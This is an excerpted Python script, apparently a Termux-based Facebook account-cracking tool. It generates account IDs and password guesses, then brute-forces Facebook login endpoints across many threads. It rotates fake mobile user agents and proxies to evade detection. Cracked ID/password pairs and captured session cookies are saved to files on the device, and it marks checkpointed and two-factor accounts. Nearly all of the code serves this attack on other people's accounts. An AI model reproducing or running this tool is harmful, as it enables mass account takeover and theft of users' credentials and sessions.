...
def generate_user_agent():
    devices = ["Samsung Galaxy S22", "iPhone 14 Pro", "Google Pixel 6", "OnePlus 10"]
    os_versions = ["Android 12", "Android 13", "iOS 16", "iOS 15"]
    browser_versions = ["Chrome/114.0", "Safari/604.1", "Firefox/105.0"]
    
    ua_template = "Mozilla/5.0 ({device}; {os_version}) AppleWebKit/537.36 (KHTML, like Gecko) {browser_version} Mobile Safari/537.36"
...
def check_network():
    try:
        ...
        log("Network status: OK")
    except subprocess.CalledProcessError:
        exit("Network connection failed. Please check your connectivity.")
...
# Lists of possible values for each part of the User-Agent
android_versions = ["6.0.1", "7.0", "8.0.0", "9", "10", "11", "12"]
device_models = ["SM-G950F", "SM-G960U", "SM-G973F", "Pixel 4", "Pixel 5", "SC-01G", "Nexus 6P"]
webkit_version = "537.36"
chrome_versions = ["88.0.4324.93", "89.0.4389.72", "90.0.4430.82", "91.0.4472.101", "92.0.4515.159"]
safari_version = "537.36"


def generate_user_agent(device="Android", version="10", browser_version="Chrome/80.0.3987.87"):
    ua_template = "Mozilla/5.0 (Linux; {device_type}; {model} Build/{build_version}; wv) {browser_version} Mobile Safari/537.36"
    devices = {
        "Android": ["Infinix X669C", "Redmi Note 8", "Samsung Galaxy S21"],
        "iOS": ["iPhone; CPU iPhone OS 14_4", "iPad; CPU OS 13_1_1"]
    }
    model = random.choice(devices.get(device, devices["Android"]))
...
# Function to generate random device model
def rc(device_list):
    return random.choice(device_list)

# List of Samsung models (you can expand this list)
samsung_devices = [
    "SM-G998B", "SM-G991B", "SM-A515F", "SM-N975F", "SM-G950F",
    "SM-T730", "SM-A320FL", "SM-G991B", "SM-G930F"
]

# Function to generate a random User-Agent string
def generate_user_agent():
    return f"Mozilla/5.0 (Linux; Android {rr(1, 11)}; {rc(samsung_devices)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(10, 107)}.0.{rr(111, 6666)}.{rr(10, 400)} Mobile Safari/537.36"

try:
	open('.prox.txt','w').write(requests.get('https://github.com/jamil688/Tasnim/blob/main/TasnimTrick.txt').text)
...
def amul():
    # Pilih versi iOS secara acak
    ios_version = random.choice(["10_0_2", "10_1_1", "10_2", "10_2_1", "10_3_1", "10_3_2", "10_3_31"])
    
    # END adalah bagian tetap dari string UA yang tidak berubah
    ...
    # Pilih user-agent secara acak dan tambahkan bagian END
    ua = random.choice([
...
def UAA():
    # Random selection of carrier network name
    tipecnc = random.choice(["T-Mobile", "vodafone ES", "vodafone", "TELCEL", "Android", "vodafone ES", "Viettel Telecom", "MegaFon", "cricket", "AIS", 
                             "Bouygues Telecom", "T-Mobile", "Telstra", "Telkomsel", "null", "Maxcom", "vodafone.de", "Yoigo", "PLAY (T-Mobile", "airtel"])
    # Random selection of locale
    cnc = random.choice(["fr_GN", "en_AU", "es_ES", "en_US", "in_ID", "en_GB", "id_ID", "cs_CZ", "pt_BR", "bg_BG", "fr_FR", "id_ID", "es_MX", 
                         "th_TH", "vi_VN", "en_EG", "fr_FR", "sv_SE"])
    # Random selection of device model
    model2 = random.choice(["SM-G986U", "SM-G973F", "SM-N960F", "moto g play", "M2103K19G", "SM-T835", "SM-A125F", "CPH2385", "Z6356T", 
                            "SM-A217F", "SM-G780G", "SM-A032F", "SM-G770F", "vivo 1920", "SM-F936B", "SM-G780G", "SM-O497J", "SM-L427V", 
                            "SM-C297Z", "SM-G507X", "SM-Y634L", "SM-J204F", "SM-R911A", "SM-X801O", "SM-A792E", "SM-H270F", "SM-P993J", 
                            "SM-V233F", "SM-O861W", "SM-D182C", "SM-Y729G", "SM-Z367Q", "SM-U191O", "SM-U559U", "SM-B567Y", "SM-O846M", 
                            "SM-G342Z", "SM-K531M", "SM-I847H", "SM-A728M", "SM-L637H", "SM-L429N", "SM-P413J", "SM-N731T", "SM-R505B", 
    ...
    # Construct the END part of the User-Agent string
    END = (f"[FBAN/FB4A;FBAV/{random.randint(111, 555)}.0.0.{random.randint(9, 300)}{random.randint(11, 555)};"
           f"[FBAN/FB4A;FBAV/{random.randint(11, 454)}.0.0.{random.randint(10, 60)}{random.randint(100, 200)};"
           f"FBPN/com.facebook.katana;FBLC/{cnc};FBBV/{random.randint(11111111, 99999999)};FBCR/{tipecnc};FBMF/samsung;"
           f"FBBD/samsung;FBDV/{model2};FBSV/{random.randint(1, 15)};FBCA/armeabi-v7a:armeabi;"
           f"FBDM/{{density={random.randint(1, 5)},width={random.randint(360, 2600)},height={random.randint(900, 9999)}}};"
           f"FB_FW/{random.randint(1, 10)};FBRV/{random.randint(11111111, 99999999)};]")

    # Construct the complete User-Agent string
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {model2} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) {END}'
...
:......:::..:::::..::..:::::..::....::........::
\033[1;97m--------------------------------------------------
\033[1;91m Author      : JAMIL CHY
\033[1;91m GitHub      : https://github.com/jamil688-
\033[1;97m Facebook    : LOUISM HALE
\033[1;97m WhatsApp    : +8801797061968
\033[1;91m Version     : 92.15
...
#method1
def rimon1():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/944.0.0.18.704;FBBV/208343827;FBDM/{density=3.0,width=720,height=1600};FBLC/en_GB;FBCR/Tele2;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.orca;FBDV/SM-S205DL;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'
        return ua
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
#method 2
def rimon2():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[[FBAN/FB4A;FBAV/477.0.0.28.194;FBBV/548358711;FBDM/{density=3.0,width=720,height=1600};FBLC/en_GB;FBCR/Tele2;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.orca;FBDV/SM-S205DL;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'
        return ua
#method3
def rimon3():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/559.0.0.92.642;FBBV/540767861;FBDM/{density=3.0,width=720,height=1600};FBLC/en_GB;FBCR/Tele2;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.orca;FBDV/SM-S205DL;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'
        return ua
        
#method 4       
def rimon4():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[[FBAN/FB4A;FBAV/371.0.0.52.748;FBBV/818415374;FBDM/{density=3.0,width=720,height=1600};FBLC/en_GB;FBCR/Tele2;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.orca;FBDV/SM-S205DL;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'
        return ua			
...
def menu():
			...
			if xd in ['1','01']:
				...
				try:
					...
					ps_limit =1
				clear()
				print('\033[ exp: first last1234,firstlast,first123')
				linex()
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as JAMIL:	
			linex()
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					...
					passlist = [psx,ids,'57575751','57273200','i love you','iloveyou','59039200','708090']
				if mthd in ['1','01']:
					JAMIL.submit(JAMIL1,ids,passlist)
				if mthd in ['2','02']:
					JAMIL.submit(JAMIL2,ids,passlist)
				if mthd in ['3','03']:
					JAMIL.submit(JAMIL3,ids,passlist)
				if mthd in ['4','04']:
					JAMIL.submit(JAMIL4,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
	...
	clear()
	print('\033[1;37m example: JAMIL, ali, sajjad, faizan\033[1;37m')
	linex()
...
def generate_ua():
    # Select a random iOS version
    ios_version = random.choice(["10_0_2", "10_1_1", "10_2", "10_2_1", "10_3_1", "10_3_2", "10_3_3"])

    # Static part of the User-Agent string
    END = ("[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};"
           "FBLC/en_US;FBCR/Videotron;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;"
           "FBDV/XT1563;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]")

    # Choose a random base UA and append the static END part
    ua = random.choice([
        "Dalvik/2.1.0 (Linux; U; Android 9; FX Build/PPR1.180610.011)", 
        "Dalvik/2.1.0 (Linux; U; Android 13; BV6200 Pro Build/TP1A.220624.014)", 
        "Dalvik/2.1.0 (Linux; U; Android 6.0.1; RS988 Build/MMB29M)",
...
def UAA():
    # Randomly select a carrier network name
    tipecnc = random.choice([
        "T-Mobile", "vodafone ES", "vodafone", "TELCEL", "Android", "Viettel Telecom", "MegaFon", "cricket", 
        "AIS", "Bouygues Telecom", "Telstra", "Telkomsel", "Maxcom", "vodafone.de", "Yoigo", "PLAY (T-Mobile)", "airtel"
    ])
    
    # Randomly select a locale
    cnc = random.choice([
        "fr_GN", "en_AU", "es_ES", "en_US", "in_ID", "en_GB", "id_ID", "cs_CZ", "pt_BR", "bg_BG", 
        "fr_FR", "es_MX", "th_TH", "vi_VN", "en_EG", "sv_SE"
    ])
    
    # Randomly select a device model
    model2 = random.choice([
        "SM-G986U", "SM-G973F", "SM-N960F", "moto g play", "M2103K19G", "SM-T835", "SM-A125F", "CPH2385", 
        "Z6356T", "SM-A217F", "SM-G780G", "SM-A032F", "SM-G770F", "vivo 1920", "SM-F936B", "SM-O497J", 
        "SM-L427V", "SM-C297Z", "SM-G507X", "SM-Y634L", "SM-J204F", "SM-R911A", "SM-X801O", "SM-A792E", 
        "SM-H270F", "SM-P993J", "SM-V233F", "SM-O861W", "SM-D182C", "SM-Y729G", "SM-Z367Q", "SM-U191O", 
        "SM-U559U", "SM-B567Y", "SM-O846M", "SM-G342Z", "SM-K531M", "SM-I847H", "SM-A728M", "SM-L637H", 
        "SM-L429N", "SM-P413J", "SM-N731T", "SM-R505B", "SM-A744X", "SM-O400L", "SM-F799H", "SM-Z679E"
    ])
    
    # Generate a random Chrome version
    vchrome = f"{random.randint(100, 925)}.0.0.{random.randint(1, 8)}.{random.randint(40, 150)}"
    
    # Generate a random Facebook App version
    VAPP = random.randint(410000000, 499999999)
    
    # Construct the END part of the User-Agent string
    END = (
        f"[FBAN/FB4A;FBAV/{random.randint(111, 555)}.0.0.{random.randint(9, 300)}{random.randint(11, 555)};"
        f"[FBAN/FB4A;FBAV/{random.randint(11, 454)}.0.0.{random.randint(10, 60)}{random.randint(100, 200)};"
        f"FBPN/com.facebook.katana;FBLC/{cnc};FBBV/{random.randint(11111111, 99999999)};FBCR/{tipecnc};"
        f"FBMF/samsung;FBBD/samsung;FBDV/{model2};FBSV/{random.randint(1, 15)};FBCA/armeabi-v7a:armeabi;"
        f"FBDM/{{density={random.randint(1, 5)},width={random.randint(360, 2600)},height={random.randint(900, 9999)}}};"
        f"FB_FW/{random.randint(1, 10)};FBRV/{random.randint(11111111, 99999999)};]"
    )
    ...
    # Construct the complete User-Agent string
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {model2} "
        f"Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) {END}"
    )
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [JAMIL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/944.0.0.18.704;FBBV/208343827;FBDM/{density=3.0,width=720,height=1600};FBLC/en_GB;FBCR/Tele2;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.orca;FBDV/SM-S205DL;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]"
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JAMIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/JAMIL-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/JAMIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[JAMIL-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [JAMIL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JAMIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/JAMIL-CP.txt','a').write(ids+'|'+pas+'\n')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JAMIL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerJAMIL = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);JAMILramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={JAMILramxan};{powerJAMIL}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/JAMIL-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/JAMIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [JAMIL-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api4(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			ses = requests.Session()
			url = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=114593902037957&kid_directed_site=0&app_id=114593902037957&signed_next=1&next=https%3A%2F%mbasic.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D114593902037957%26cbt%3D1701088365087%26channel_url%3Dhttps%253A%252F%252Fstaticxmbasic.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3cab5fd61e0304%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%26client_id%3D114593902037957%26display%3Dtouch%26domain%3Dpixabay.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpixabay.com%252Fphotos%252F%26locale%3Den_US%26logger_id%3Df2534d0c16a119%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxmbasic.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df284c1bec159d1%2526domain%253Dpixabay.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpixabay.com%25252Ff35533a5a42b844%2526relation%253Dopener%2526frame%253Df3ef3d0493a9da%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxmbasic.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df284c1bec159d1%26domain%3Dpixabay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpixabay.com%252Ff35533a5a42b844%26relation%3Dopener%26frame%3Df3ef3d0493a9da%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en&pl_dbl=0&refsrc=deprecated&_rdr"
			head1 = {'Host': 'mbasic.facebook.com',
    ...
    'user-agent': ua,
			...
			ses.post(f'https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=head,data=data,cookies={'cookie': yusup},proxies=prox(),allow_redirects=False)
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [JAMIL-CP] '+ids+' | '+pas)
				open('/sdcard/JAMIL-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [JAMIL-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/JAMIL-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/JAMIL-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def JAMIL1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [JAMIL] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
    ...
    'viewport-width': '980',
			...
			reqs = ses.get("https://mbasic.facebook.com/").text
			...
			headers.update({"Cookie":f"wd=720x1600; dpr=2; _js_datr={datr}"})
			break
		except Exception as e:pass
	for pas in passlist:
		try:
			data.update({"pass":"".join(pas)})
			response = ses.post("https://mbasic.facebook.com/login/password/", data=data, headers=headers, proxies=prox(), allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [JAMIL-OK] '+uid+' | '+pas+'\033[1;37m')
				oks.append(uid)
				open('/sdcard/JAMIL-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
			elif "mbasic.facebook.com%2Fcheckpoint" in str(response.headers.get('Location')):
				try:
...
def make_get_request(url):
    try:
        requests.get('https://github.com/JAMIL-GHANIZADA')
    except requests.exceptions.ConnectionError:
...
def approval():
	...
	key = "JAMIL-"+plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '').replace("SMPP","").replace("YT","")
	global key1
	try:
		...
		subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+93795317603&text=Hello JAMIL Sir ! Please Approve My Key The JAMIL Key Is : "+ key+'|'+key1])
		time.sleep(0)
		approval()
